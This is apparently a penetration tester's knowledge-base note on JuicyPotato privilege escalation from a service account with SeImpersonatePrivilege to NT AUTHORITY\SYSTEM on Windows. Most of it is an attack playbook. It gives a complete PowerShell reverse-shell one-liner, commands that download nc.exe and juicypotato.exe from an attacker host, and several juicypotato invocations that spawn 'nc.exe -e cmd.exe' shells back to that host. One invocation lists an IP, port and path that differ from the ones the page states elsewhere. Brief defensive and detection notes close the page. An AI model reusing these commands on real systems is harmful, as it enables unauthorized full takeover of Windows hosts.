## Overview

`JuicyPotato` abuses Windows token impersonation behavior to elevate privileges from a service account context to `NT AUTHORITY\SYSTEM`.

This technique is commonly useful when the current user has:

```text
SeImpersonatePrivilege
```

Typical vulnerable contexts include service accounts such as:

```text
iis apppool
network service
local service
service accounts running web apps
```

The general flow is:

```text
Gain code execution as a low-privileged service user
↓
Confirm SeImpersonatePrivilege
↓
Upload JuicyPotato and nc.exe
↓
Find or select a working CLSID
↓
Trigger JuicyPotato
↓
Spawn SYSTEM reverse shell
```

> [!important]
> JuicyPotato is mainly relevant to older Windows versions. On newer systems, consider alternatives such as [[PrintSpoofer]], [[RoguePotato]], or [[GodPotato]] depending on OS version and context.

---

# Requirements

## Required Privilege

Check current privileges:

```cmd
whoami /priv
```

Look for:

```text
SeImpersonatePrivilege        Enabled
```

If `SeImpersonatePrivilege` is missing, JuicyPotato is unlikely to work.

---

## Required Tools

Tools needed on the target:

```text
juicypotato.exe
nc.exe
```

Example working directory:

```text
C:\Users\Default\Tools
```

Attack host details used in this example:

```text
Attack IP: 10.10.15.190
Initial shell port: 4444
SYSTEM shell port: 4141
```

---

# Initial Reverse Shell Example

If command execution is available, a PowerShell reverse shell can be used to establish initial access.

Start a listener on the attack host:

```bash
nc -lnvp 4444
```

Execute through the available command execution vector:

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.15.190',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Confirm the shell context:

```cmd
whoami
```

```cmd
whoami /priv
```

---

# Upload JuicyPotato and nc.exe

## Host Tools on Attack Machine

From the directory containing `juicypotato.exe` and `nc.exe`:

```bash
python3 -m http.server 8000
```

---

## Create Tools Directory on Target

```powershell
mkdir C:\Users\Default\Tools
```

---

## Download nc.exe

```powershell
iwr -Uri http://10.10.15.190:8000/nc.exe -OutFile C:\Users\Default\Tools\nc.exe
```

---

## Download JuicyPotato

```powershell
iwr -Uri http://10.10.15.190:8000/juicypotato.exe -OutFile C:\Users\Default\Tools\juicypotato.exe
```

Confirm both files are present:

```cmd
dir C:\Users\Default\Tools
```

---

# Find CLSIDs

JuicyPotato needs a CLSID that can trigger the required COM behavior.

Enumerate CLSIDs with `LocalService` entries:

```cmd
reg query HKCR\CLSID /s /f LocalService
```

Example CLSID used:

```text
{C49E32C6-BC8B-11d2-85D4-00105A1F8304}
```

> [!tip]
> CLSID reliability varies by OS and installed components. If one CLSID fails, try another known-good CLSID for the target version.

---

# Start SYSTEM Shell Listener

On the attack host:

```bash
nc -lnvp 4141
```

---

# Run JuicyPotato

On the target:

```cmd
cd C:\Users\Default\Tools
```

```cmd
.\juicypotato.exe -l 4141 -c "{C49E32C6-BC8B-11d2-85D4-00105A1F8304}" -p c:\windows\system32\cmd.exe -a " /c c:\users\public\nc.exe -e cmd.exe 192.168.45.232 4443" -t *
```

## Command Breakdown

| Option | Value | Purpose |
|---|---|---|
| `-l` | `4141` | Local COM listener port used by JuicyPotato |
| `-c` | `{C49E32C6-BC8B-11d2-85D4-00105A1F8304}` | CLSID to instantiate |
| `-p` | `c:\windows\system32\cmd.exe` | Program launched with impersonated token |
| `-a` | `/c ...nc.exe -e cmd.exe...` | Arguments passed to `cmd.exe` |
| `-t` | `*` | Try available token creation methods |

The executed reverse shell command is:

```cmd
c:\users\default\tools\nc.exe -e cmd.exe 10.10.15.190 4141
```

---

# Successful Output

Successful JuicyPotato output should look similar to:

```text
Testing {C49E32C6-BC8B-11d2-85D4-00105A1F8304} 4141
......
[+] authresult 0
{C49E32C6-BC8B-11d2-85D4-00105A1F8304};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

Key success indicators:

```text
NT AUTHORITY\SYSTEM
CreateProcessWithTokenW OK
```

---

# Confirm SYSTEM Shell

In the Netcat listener:

```cmd
whoami
```

Expected output:

```text
nt authority\system
```

---

# Practical Decision Tree

## Does the current user have SeImpersonatePrivilege?

Run:

```cmd
whoami /priv
```

If present:

```text
SeImpersonatePrivilege
```

continue with JuicyPotato testing.

---

## Are JuicyPotato and nc.exe on the target?

Upload both files to a writable directory:

```text
C:\Users\Default\Tools
```

---

## Is a working CLSID available?

Enumerate:

```cmd
reg query HKCR\CLSID /s /f LocalService
```

Use a known-good CLSID for the target OS.

---

## Did JuicyPotato succeed?

Look for:

```text
authresult 0
NT AUTHORITY\SYSTEM
CreateProcessWithTokenW OK
```

---

## Did the SYSTEM callback connect?

Confirm listener received a shell:

```cmd
whoami
```

Expected:

```text
nt authority\system
```

---

# Troubleshooting

## JuicyPotato does not return SYSTEM

Possible causes:

- target OS is patched or unsupported
- current user lacks `SeImpersonatePrivilege`
- CLSID does not work
- local listener port is blocked or already in use
- `nc.exe` path is wrong
- reverse shell callback is blocked
- token creation method fails
- command quoting issue

Try a different local port:

```cmd
.\juicypotato.exe -l 4142 -c "{CLSID}" -p c:\windows\system32\cmd.exe -a " /c c:\users\default\tools\nc.exe -e cmd.exe 10.10.15.190 4141" -t *
```

Try a specific token creation method:

```cmd
.\juicypotato.exe -l 4142 -c "{CLSID}" -p c:\windows\system32\cmd.exe -a " /c c:\users\default\tools\nc.exe -e cmd.exe 10.10.15.190 4141" -t t
```

```cmd
.\juicypotato.exe -l 4142 -c "{CLSID}" -p c:\windows\system32\cmd.exe -a " /c c:\users\default\tools\nc.exe -e cmd.exe 10.10.15.190 4141" -t u
```

---

## Netcat listener receives no shell

Check that the listener is running:

```bash
nc -lnvp 4141
```

Check that `nc.exe` exists:

```cmd
dir C:\Users\Default\Tools\nc.exe
```

Check that the JuicyPotato command uses the correct attack IP and port:

```text
10.10.15.190:4141
```

---

## Tool upload fails

Host tools:

```bash
python3 -m http.server 8000
```

Download with PowerShell:

```powershell
iwr -Uri http://10.10.15.190:8000/nc.exe -OutFile C:\Users\Default\Tools\nc.exe
```

Alternative with `certutil`:

```cmd
certutil.exe -urlcache -split -f http://10.10.15.190:8000/nc.exe C:\Users\Default\Tools\nc.exe
```

---

# Command Reference

## Check privileges

```cmd
whoami /priv
```

## Host tools

```bash
python3 -m http.server 8000
```

## Create tools directory

```powershell
mkdir C:\Users\Default\Tools
```

## Download nc.exe

```powershell
iwr -Uri http://10.10.15.190:8000/nc.exe -OutFile C:\Users\Default\Tools\nc.exe
```

## Download JuicyPotato

```powershell
iwr -Uri http://10.10.15.190:8000/juicypotato.exe -OutFile C:\Users\Default\Tools\juicypotato.exe
```

## Enumerate CLSIDs

```cmd
reg query HKCR\CLSID /s /f LocalService
```

## Start listener for SYSTEM shell

```bash
nc -lnvp 4141
```

## Run JuicyPotato

```cmd
.\juicypotato.exe -l 4141 -c "{C49E32C6-BC8B-11d2-85D4-00105A1F8304}" -p c:\windows\system32\cmd.exe -a " /c c:\users\default\tools\nc.exe -e cmd.exe 10.10.15.190 4141" -t *
```

## Confirm SYSTEM

```cmd
whoami
```

---

# Cleanup Checklist

Remove uploaded tools:

```text
C:\Users\Default\Tools\juicypotato.exe
C:\Users\Default\Tools\nc.exe
```

Stop local listeners:

```text
Netcat listener
Python HTTP server
```

Document:

- original user context
- `whoami /priv` output
- uploaded tool paths
- CLSID used
- JuicyPotato command
- JuicyPotato success output
- SYSTEM proof
- cleanup actions

---

# Defensive Notes

## Root Causes

This escalation depends on:

- service context with `SeImpersonatePrivilege`
- exploitable COM/DCOM behavior
- ability to upload and execute binaries
- outbound connectivity for reverse shell
- insufficient application control

---

# Defensive Controls

Recommended mitigations:

- patch systems affected by potato-style token impersonation attacks
- review services that run with `SeImpersonatePrivilege`
- restrict service account privileges
- prevent unauthorized binary execution with application control
- block tools such as `nc.exe`
- restrict outbound connectivity from servers
- monitor suspicious COM activity
- monitor `CreateProcessWithTokenW` abuse
- alert on JuicyPotato execution or known command-line patterns

---

# Detection Ideas

Monitor for:

```text
juicypotato.exe
nc.exe -e cmd.exe
reg query HKCR\CLSID /s /f LocalService
CreateProcessWithTokenW
unexpected SYSTEM cmd.exe
PowerShell downloading executables
```

Suspicious process pattern:

```text
low-privileged service process
↓
juicypotato.exe
↓
cmd.exe
↓
nc.exe -e cmd.exe
```

---

# Key Takeaways

- `SeImpersonatePrivilege` is the key indicator for JuicyPotato-style escalation.
- JuicyPotato can abuse token impersonation to spawn a process as `NT AUTHORITY\SYSTEM`.
- A working CLSID is required.
- `nc.exe` must be present on the target if using it for the SYSTEM reverse shell.
- Successful output includes `NT AUTHORITY\SYSTEM` and `CreateProcessWithTokenW OK`.
- If JuicyPotato fails, test other CLSIDs, ports, token creation methods, or potato variants.

---

# Related Notes

- [[Windows Privilege Escalation]]
- [[SeImpersonatePrivilege]]
- [[JuicyPotato]]
- [[Potato Attacks]]
- [[Token Impersonation]]
- [[CreateProcessWithTokenW]]
- [[Netcat]]
- [[PowerShell Reverse Shell]]
- [[PrintSpoofer]]
- [[RoguePotato]]
- [[GodPotato]]

---

# Tags

#windows
#privilege-escalation
#juicypotato
#seimpersonateprivilege
#token-impersonation
#potato-attacks
#createprocesswithtokenw
#netcat
#powershell
#reverse-shell
#pentesting